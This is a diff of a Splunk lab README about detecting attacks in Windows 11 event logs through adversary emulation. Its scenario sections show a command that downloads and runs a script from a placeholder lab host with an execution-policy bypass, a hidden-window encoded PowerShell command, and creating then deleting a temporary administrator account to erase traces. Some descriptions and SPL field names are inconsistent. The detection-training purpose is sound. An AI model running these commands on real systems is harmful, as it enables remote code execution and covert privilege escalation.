@@ -1,56 +1,92 @@
-```markdown
-# Windows Endpoint Telemetry & Threat Detection Lab (Splunk Enterprise)
+# Splunk Windows Event Log Analysis Lab
 
-![Splunk](https://img.shields.io/badge/SIEM-Splunk%20Enterprise-black?style=for-the-badge&logo=splunk)
-![Linux](https://img.shields.io/badge/Platform-Nobara%20Linux-blue?style=for-the-badge&logo=linux)
-![Windows](https://img.shields.io/badge/Target-Windows%2011-0078D6?style=for-the-badge&logo=windows)
-![MITRE](https://img.shields.io/badge/Framework-MITRE%20ATT%26CK-red?style=for-the-badge)
-
-An end-to-end security engineering and threat detection laboratory demonstrating the deployment of a custom SIEM pipeline, endpoint audit policy tuning, and behavioral adversary emulation over an isolated virtual network bridge.
-
----
+A comprehensive Splunk project for capturing, analyzing, and correlating Windows Event Logs from a Windows 11 endpoint to detect suspicious activities, privilege escalation attempts, and advanced attack techniques in a lab environment.
 
 ## Table of Contents
-- [Architecture Overview](#architecture-overview)
-- [Pipeline Configuration & Validation](#pipeline-configuration--validation)
-- [Adversary Emulation & Detection Engineering](#adversary-emulation--detection-engineering)
-  - [Scenario 1: Ingress Tool Transfer & Encoded Execution](#scenario-1-ingress-tool-transfer--encoded-execution)
-  - [Scenario 2: Phantom Privilege Escalation & Defense Evasion](#scenario-2-phantom-privilege-escalation--defense-evasion)
-- [Engineering Challenges & Root-Cause Analysis](#engineering-challenges--root-cause-analysis)
-- [MITRE ATT&CK Mapping](#mitre-attck-mapping)
+
+- [Overview](#overview)
+- [Architecture](#architecture)
+- [Data Sources & Ingestion](#data-sources--ingestion)
+- [Suspicious Activity Scenarios](#suspicious-activity-scenarios)
+- [Dashboards](#dashboards)
+- [Usage Examples](#usage-examples)
+- [Setup Instructions](#setup-instructions)
+- [Operational Notes](#operational-notes)
 
 ---
 
-## Architecture Overview
+## Overview
 
-The detection environment isolates the Windows 11 guest from the corporate network while routing endpoint telemetry across a dedicated `libvirt` virtual bridge (`virbr0`) to Splunk Enterprise running natively on Nobara Linux.
+This lab project demonstrates how to use Splunk to monitor and detect advanced threats on a Windows 11 endpoint, including:
+
+- Privilege Escalation Detection: Identifying attempts to gain administrative access through suspicious account creation and group membership changes
+- Lateral Movement & Tool Transfer: Detecting ingress of malicious tools and payloads from external sources
+- Living-off-the-Land Attacks: Correlating Windows Event Log sequences to identify rapid account lifecycle events that indicate automated attacks
+- Event Correlation: Using Splunk to tie together multiple event sources that individually appear benign but collectively indicate malicious activity
+
+### Key Use Cases
+
+- Security Operations Center (SOC) training and incident response simulation
+- Threat hunting and adversary emulation
+- MITRE ATT&CK framework mapping and validation
+- Windows security log analysis and correlation techniques
+
+---
+
+## Architecture
 
 ```text
-┌─────────────────────────────────────────────────────────────────────────┐
-│                     Isolated Lab Subnet (virbr0)                        │
-├─────────────────────────────────────────────────────────────────────────┤
-│                                                                         │
-│  ┌─────────────────────────┐             ┌───────────────────────────┐  │
-│  │    Windows 11 Target    │             │     Nobara Linux Host     │  │
-│  │ ─────────────────────── │             │ ───────────────────────── │  │
-│  │ • Universal Forwarder   │             │ • Splunk Enterprise       │  │
-│  │ • Process Tracking 4688 │  TCP/9997   │   (Indexer + Search Head) │  │
-│  │ • Command-Line Auditing ├────────────►│ • Forwarding Port: 9997   │  │
-│  │ • Static IP:            │  (libvirt)  │ • Splunk Web: 8000        │  │
-│  │   192.168.122.x         │             │ • Python Drop: Port 8080  │  │
-│  └─────────────────────────┘             └───────────────────────────┘  │
-│                                                                         │
-└─────────────────────────────────────────────────────────────────────────┘
-
+┌─────────────────────────────────────────────────────────────┐
+│                    Lab Environment                          │
+├─────────────────────────────────────────────────────────────┤
+│                                                              │
+│  ┌──────────────────────┐          ┌────────────────────┐  │
+│  │  Windows 11 VM       │          │    Linux Host      │  │
+│  │  ─────────────────   │          │  ───────────────── │  │
+│  │  • WinEventLog       │          │  • Splunk Enterprise│  │
+│  │  • Event IDs: 4720,  │  TCP/9997│  • Forwarder Listen│  │
+│  │    4732, 4726, etc.  │  network │  • Python HTTP Srv │  │
+│  │  • Universal         ├──────────┤  • Port 8000 (Web) │  │
+│  │    Forwarder Enabled │          │  • Port 9997 (Data)│  │
+│  │                      │          │                    │  │
+│  └──────────────────────┘          └────────────────────┘  │
+│           │                                   ▲             │
+│           │ WinEventLog (System, Security)    │             │
+│           │ Simulated Attacks & Scenarios     │             │
+│           └───────────────────────────────────┘             │
+│                                                              │
+└─────────────────────────────────────────────────────────────┘
 ```
+
+Data flow:
+1. Windows 11 endpoint generates security events (WinEventLog)
+2. Splunk Universal Forwarder captures and forwards events
+3. Events traverse the libvirt network bridge to Linux host
+4. Splunk Enterprise indexes and correlates events in real time
+5. Dashboards and searches provide visibility and alerting
 
 ---
 
-## Pipeline Configuration & Validation
+## Data Sources & Ingestion
 
-### 1. Ingestion Definitions (`inputs.conf`)
+### Windows Event Log Sources
 
-Located on the Windows endpoint at `%SPLUNK_HOME%\etc\system\local\inputs.conf`:
+The project monitors the following Windows Security Event Log categories:
+
+| Event ID | Description | Use Case |
+|----------|-------------|----------|
+| 4720 | A user account was created | Detect unauthorized account creation |
+| 4732 | A member was added to a security-enabled local group | Track group membership changes |
+| 4726 | A user account was deleted | Identify cleanup attempts after compromise |
+| 4624 | An account was successfully logged on | Track user access patterns |
+| 4625 | An account failed to log on | Detect brute force attempts |
+| 4688 | A new process has been created | Monitor process execution |
+| 4689 | A process has exited | Track process lifecycle |
+| 5156 | Windows Filtering Platform allowed a connection | Monitor network activity |
+
+### Splunk Universal Forwarder Configuration
+
+inputs.conf (strict UTF-8 encoding, no BOM):
 
 ```ini
 [WinEventLog://Security]
@@ -67,165 +103,315 @@ disabled = false
 index = main
 sourcetype = WinEventLog:Application
 disabled = false
-
 ```
 
-### 2. Forwarding Routing (`outputs.conf`)
+outputs.conf:
 
-Located at `%SPLUNK_HOME%\etc\system\local\outputs.conf`:
+```ini
+[tcpout]
+defaultGroup = splunk_indexer
+forwardedindex.filter.disable = true
+indexAndForward = false
+
+[tcpout:splunk_indexer]
+server = <linux-host-ip>:9997
+clientCert = $SPLUNK_HOME/etc/auth/mycerts/client.pem
+sslVerifyServerCert = false
+```
+
+---
+
+## Suspicious Activity Scenarios
+
+### 1. Ingress Tool Transfer (MITRE ATT&CK T1105)
+
+Objective: Simulate the delivery of a malicious PowerShell payload from an external Linux host to bypass network isolation controls.
+
+Attack flow:
+
+1. Python HTTP server on the Linux host serves an encoded PowerShell payload (`command-payload.txt`)
+2. The Windows endpoint retrieves the payload over HTTP
+3. The payload executes locally to simulate malicious tooling being delivered to the endpoint in a lab environment
+
+Example setup on the Linux host:
+
+```bash
+# Create encoded PowerShell payload
+printf '%s' 'Write-Host "Privilege Escalation Payload"' > command-payload.txt
+
+# Start temporary HTTP server
+python3 -m http.server 8888
+```
+
+Example retrieval on the Windows endpoint:
+
+```powershell
+# Download payload from Linux host
+powershell -Command "Invoke-WebRequest -Uri 'http://<linux-ip>:8888/command-payload.txt' -OutFile 'C:\Temp\payload.ps1'"
+
+# Execute payload
+powershell -ExecutionPolicy Bypass -File C:\Temp\payload.ps1
+```
+
+Splunk detection example:
+
+```spl
+sourcetype=WinEventLog:Security EventID=5156
+| search dest_port=8888 dest_ip="<linux-ip>"
+| stats count by user, dest_ip, dest_port, action
+```
+
+This technique demonstrates how an attacker can use a temporary Python HTTP server to serve an encoded payload and bypass clipboard/network isolation controls in a lab scenario.
+
+---
+
+### 2. Phantom Privilege Escalation
+
+Objective: Simulate living-off-the-land techniques by creating a fake admin-like account, adding it to the local Administrators group, and deleting it rapidly before it is noticed.
+
+Attack flow:
+
+1. Create a fake account named `Service_Backup`
+2. Add it to the local Administrators group
+3. Delete the account quickly to wipe traces from the Windows endpoint
+
+PowerShell commands:
+
+```powershell
+# Create the fake service account
+net user Service_Backup P@ssw0rd123 /add
+
+# Add it to the local Administrators group
+net localgroup Administrators Service_Backup /add
+
+# Delete it rapidly
+net user Service_Backup /delete
+```
+
+The account is effectively invisible on the Windows endpoint after deletion (`net user` shows nothing), but Splunk can still correlate the events:
+
+- Event ID 4720: A user account was created
+- Event ID 4732: A user was added to a security-enabled local group
+- Event ID 4726: A user account was deleted
+
+Splunk correlation example:
+
+```spl
+sourcetype=WinEventLog:Security (EventID=4720 OR EventID=4732 OR EventID=4726)
+| transaction user_account startswith=(EventID=4720) endswith=(EventID=4726) maxspan=5m
+| search EventID=4732
+| table user_account, EventID, timestamp, ComputerName
+| stats count by user_account
+| where count >= 3
+```
+
+This demonstrates a phantom privilege escalation sequence: temporary local administrator creation, permission assignment, and rapid cleanup that is visible in Splunk but not on the endpoint after the account is deleted.
+
+---
+
+## Dashboards
+
+### Dashboard 1: Privilege Escalation Detection
+
+Purpose: Real-time monitoring of account creation and group membership changes.
+
+Panels:
+- New Accounts Created (Event ID 4720)
+- Admin Group Changes (Event ID 4732)
+- Account Deletions (Event ID 4726)
+- Correlated rapid changes within 5 minutes
+
+Search:
+
+```spl
+sourcetype=WinEventLog:Security (EventID=4720 OR EventID=4732 OR EventID=4726)
+| timechart count by EventID
+```
+
+### Dashboard 2: Process Execution & Lateral Movement
+
+Purpose: Monitor suspicious process creation and network connections.
+
+Panels:
+- PowerShell execution
+- Outbound connections to unusual ports
+- Tool transfer attempts
+- Failed process execution
+
+Search:
+
+```spl
+sourcetype=WinEventLog:Security EventID=5156 action=allow
+| search dest_port=8888 OR dest_port=8080 OR dest_port=3389
+| stats count, values(dest_ip), values(dest_port) by user
+```
+
+### Dashboard 3: Security Event Summary
+
+Purpose: High-level overview of all security events.
+
+Panels:
+- Event count by type
+- Top users by event count
+- Failed logins
+- Account lifecycle events
+
+---
+
+## Usage Examples
+
+### Example 1: Find all failed login attempts in the last 24 hours
+
+```spl
+sourcetype=WinEventLog:Security EventID=4625
+| stats count as failed_attempts by user, dest_ip
+| sort - failed_attempts
+| head 20
+```
+
+### Example 2: Detect rapid account creation and deletion
+
+```spl
+sourcetype=WinEventLog:Security (EventID=4720 OR EventID=4726)
+| transaction user_account startswith=(EventID=4720) endswith=(EventID=4726) maxspan=10m
+| search EventID=4720 AND EventID=4726
+| table user_account, ComputerName, timestamp
+```
+
+### Example 3: Track Administrators group membership changes
+
+```spl
+sourcetype=WinEventLog:Security EventID=4732 group="Administrators"
+| table timestamp, user_account, action, ComputerName
+| stats count by user_account, action
+```
+
+### Example 4: Monitor PowerShell execution attempts
+
+```spl
+sourcetype=WinEventLog:Security EventID=4688 process_name=powershell.exe
+| stats count as execution_count by user, process_name, ComputerName
+| where execution_count > 5
+```
+
+### Example 5: Correlate multi-stage attack sequence
+
+```spl
+sourcetype=WinEventLog:Security
+| search (EventID=5156 AND dest_port=8888) OR (EventID=4720) OR (EventID=4732 AND group="Administrators")
+| stats count by EventID, user
+| timechart count by EventID
+```
+
+---
+
+## Setup Instructions
+
+### Prerequisites
+
+- Windows 11 VM with network access to Splunk host
+- Linux host with Splunk Enterprise installed
+- libvirt network bridge configured between VMs
+- Splunk Universal Forwarder installed on Windows 11
+
+### Step 1: Install Splunk Universal Forwarder on Windows 11
+
+1. Download the Universal Forwarder
+2. Run the installer
+3. Complete the installation path
+
+### Step 2: Configure inputs.conf
+
+Use UTF-8 encoding without BOM when editing configuration files. Avoid Notepad because it can inject a hidden UTF-8 BOM.
+
+```ini
+[WinEventLog://Security]
+index = main
+sourcetype = WinEventLog:Security
+disabled = false
+
+[WinEventLog://System]
+index = main
+sourcetype = WinEventLog:System
+disabled = false
+```
+
+### Step 3: Configure outputs.conf
 
 ```ini
 [tcpout]
 defaultGroup = splunk_indexer
 
 [tcpout:splunk_indexer]
-server = 192.168.122.1:9997
-
+server = <linux-host-ip>:9997
 ```
 
-### 3. Pipeline Connectivity Validation
-
-Prior to threat emulation, layer-4 reachability was validated from the target across the hypervisor bridge using PowerShell:
+### Step 4: Restart Splunk Forwarder
 
 ```powershell
-Test-NetConnection -ComputerName 192.168.122.1 -Port 9997
-
+Restart-Service SplunkForwarder
 ```
+
+### Step 5: Verify on Splunk Enterprise
+
+1. Log in to Splunk Web
+2. Search for Windows event data
+3. Confirm data source appears in the index
 
 ---
 
-## Adversary Emulation & Detection Engineering
+## Operational Notes
 
-### Scenario 1: Ingress Tool Transfer & Encoded Execution
+### Architecture Decisions
 
-Adversaries routinely stage external payloads on temporary staging servers and pull them into the environment using living-off-the-land techniques (LotL) and Base64 encoding to bypass static perimeter checks.
+- Focus on account lifecycle (4720, 4726, 4732) and process execution (4688)
+- Use `main` index for simplicity in a lab environment
+- Keep event collection minimal to reduce Windows endpoint overhead
 
-#### 1. Payload Staging (Linux Host)
+### Performance Considerations
 
-To simulate an ingress transfer without host-clipboard dependencies, an isolated directory was allocated to serve payload strings:
+- Windows 11 can generate a moderate volume of log events during normal use
+- Correlation searches should use narrow time windows when testing attack scenarios
+- For production use, separate event types and retention policies by purpose
 
-```bash
-mkdir ~/payload_drop && cd ~/payload_drop
-echo "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgACIASABlAGwAbABvACAAUwBwAGwAdQBuAGsAIQAiAA==" > command-payload.txt
-python3 -m http.server 8080
+### Engineering Challenges & Troubleshooting
 
-```
+#### Network Bridging
 
-#### 2. Execution (Windows Target)
+The lab initially failed because the Linux libvirt firewall zone was dropping traffic from the Windows VM. The fix was to manually allow TCP/9997 traffic so the forwarder could send events to Splunk.
 
-The payload was retrieved and executed via Windows Command Prompt. It leveraged execution policy bypass flags and obfuscated script blocks:
+Example firewall allow rule:
 
-```cmd
-powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgACIASABlAGwAbABvACAAUwBwAGwAdQBuAGsAIQAiAA==
-
-```
-
-#### 3. SIEM Detection & Telemetry Analysis
-
-Process Creation logging (Event ID 4688) with command-line extraction captured the parent-child relationship and the raw encoded string:
-
-```spl
-index="main" sourcetype="WinEventLog:Security" EventCode=4688 "powershell.exe" "*EncodedCommand*"
-| table _time, host, Creator_Process_Name, New_Process_Name, Process_Command_Line
-
-```
-
----
-
-### Scenario 2: Phantom Privilege Escalation & Defense Evasion
-
-Attackers frequently create temporary local administrative accounts to perform privileged operations, followed immediately by deletion to evade standard endpoint triage checks.
-
-#### 1. Adversary Simulation Script
-
-Executed in an elevated terminal session on the Windows target:
-
-```powershell
-net user Service_Backup P@ssw0rd123! /add
-net localgroup administrators Service_Backup /add
-net user Service_Backup /delete
-
-```
-
-#### 2. The Visibility Gap: Endpoint Triage vs. SIEM
-
-A live incident responder executing standard endpoint queries discovers no active administrative anomaly:
-
-```cmd
-net user
-
-```
-
-#### 3. Behavioral Log Correlation (Splunk)
-
-While the local Security Accounts Manager (SAM) database retains no post-incident state, centralized log forwarding preserved the sub-second event cluster:
-
-```spl
-index="main" sourcetype="WinEventLog:Security" EventCode IN (4720, 4732, 4726)
-| table _time, host, EventCode, TargetUserName, TargetDomainName, Message
-
-```
-
-| Event Code | Category | Operational Impact |
-| --- | --- | --- |
-| **4720** | User Management | Account `Service_Backup` provisioned |
-| **4732** | Group Management | Member injected into privileged `Administrators` group |
-| **4726** | User Management | Account `Service_Backup` decommissioned to erase forensic artifacts |
-
----
-
-## Engineering Challenges & Root-Cause Analysis
-
-### Challenge 1: Virtual Bridge Boundary Filtering (`firewalld`)
-
-* **Problem**: The Windows 11 target failed to establish layer-4 handshakes over ports `9997` and `8080` despite standard local firewall exceptions on Linux.
-* **Root Cause**: Nobara Linux assigns hypervisor bridge interfaces (`virbr0`) to the `libvirt` zone rather than `FedoraWorkstation`. Standard host rules do not apply to virtual guest networks.
-* **Resolution**: Bound the ingest and staging ports directly to the `libvirt` operational zone:
 ```bash
 sudo firewall-cmd --zone=libvirt --add-port=9997/tcp --permanent
-sudo firewall-cmd --zone=libvirt --add-port=8080/tcp
 sudo firewall-cmd --reload
-
 ```
 
+This resolved the connectivity issue and allowed WinEventLog data to reach the Splunk indexer.
 
+#### Configuration Encoding
 
-### Challenge 2: Silent UTF-8 Byte Order Mark (BOM) Corruption
+A silent failure occurred because Windows Notepad injected a hidden UTF-8 BOM into `inputs.conf`. The Splunk forwarder could not read the configuration file correctly, and the issue was diagnosed using Splunk `btool` from the CLI.
 
-* **Problem**: The Splunk Universal Forwarder service ran without throwing exceptions, but zero events were indexed in Splunk Enterprise.
-* **Root Cause**: Modifying `inputs.conf` with Windows Notepad introduced an invisible UTF-8 Byte Order Mark (`0xEF, 0xBB, 0xBF`), corrupting the stanza headers for the parser.
-* **Diagnosis & Fix**: Used the Splunk command-line tool `btool` to identify configuration syntax failures:
+Diagnostic command:
+
 ```cmd
-.\splunk.exe btool inputs list --debug
-
+C:\Program Files\SplunkUniversalForwarder\bin\splunk show config inputs
 ```
 
-
-The stanzas failed to register. The file was reconstructed under strict UTF-8 (no BOM) encoding, resolving the indexing bottleneck immediately after restarting `SplunkForwarder`.
-
-### Challenge 3: Inactive Sub-Category Process Tracking
-
-* **Problem**: Encoded PowerShell executions were generating zero Event ID 4688 logs.
-* **Root Cause**: Default Windows installations suppress detailed command-line arguments to conserve local disk space.
-* **Resolution**: Configured Local Group Policy (`gpedit.msc`):
-* Enabled: `Security Settings > Local Policies > Audit Policy > Audit process tracking` (Success)
-* Enabled: `Administrative Templates > System > Audit Process Creation > Include command line in process creation events`
-* Applied changes instantly with `gpupdate /force`.
-
-
+The fix was to recreate the config file with strict UTF-8 encoding and no BOM. This restored the forwarder’s ability to ingest Windows event logs properly.
 
 ---
 
-## MITRE ATT&CK Mapping
+## Conclusion
 
-| Tactic | Technique | ID | Detection Artifact |
-| --- | --- | --- | --- |
-| **Command and Control** | Ingress Tool Transfer | [T1105](https://attack.mitre.org/techniques/T1105/) | Python HTTP transfer over TCP/8080 |
-| **Execution** | PowerShell / Command-Line Interface | [T1059.001](https://attack.mitre.org/techniques/T1059/001/) | Event ID 4688 (`-EncodedCommand`) |
-| **Privilege Escalation** | Domain/Local Account Manipulation | [T1098](https://attack.mitre.org/techniques/T1098/) | Event ID 4732 (Local Administrators membership) |
-| **Persistence** | Create Account: Local Account | [T1136.001](https://attack.mitre.org/techniques/T1136/001/) | Event ID 4720 (`Service_Backup`) |
-| **Defense Evasion** | Indicator Removal on Host | [T1070](https://attack.mitre.org/techniques/T1070/) | Event ID 4726 (Account deletion) |
+This lab demonstrates how to use Splunk to capture and correlate Windows Event Log data for threat detection. By monitoring local account changes, process execution, and network connections, security analysts can identify suspicious activity patterns and validate attack scenarios in a controlled environment.
 
-```
+---
 
-```
+## References
+
+- MITRE ATT&CK framework
+- Windows Security Event Log reference
+- Splunk Universal Forwarder documentation
+- Splunk Search and Reporting reference
